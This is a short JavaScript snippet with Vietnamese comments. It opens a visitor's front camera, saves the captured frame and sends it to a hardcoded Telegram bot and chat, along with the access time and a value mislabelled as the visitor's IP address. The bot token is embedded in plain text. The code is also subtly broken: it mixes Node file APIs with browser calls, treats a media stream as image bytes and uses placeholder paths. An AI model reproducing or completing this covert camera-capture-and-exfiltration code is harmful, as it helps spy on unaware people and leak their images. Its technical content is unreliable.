// Import các thư viện cần thiết
const fs = require("fs");
const Telegram = require("telegram-bot-api");

// Tạo đối tượng bot Telegram
const bot = new Telegram("6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0");

// Lấy thời gian truy cập
const time = new Date();

// Chụp ảnh camera
const imageData = await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
        facingMode: "user",
    },
});

// Lưu ảnh vào file
const imagePath = `image-${time.getTime()}.jpg`;
fs.writeFileSync(imagePath, imageData);

// Gửi dữ liệu đến bot Telegram
const message = {
    text: `Thời gian truy cập: ${time.toLocaleString()}

Địa chỉ IP: ${window.location.hostname}`,
    photo: {
        url: `https://raw.githubusercontent.com/[nhantubtr]/[Ok]/main/${imagePath}`,
    },
};
bot.sendMessage(-1002081721946, message);
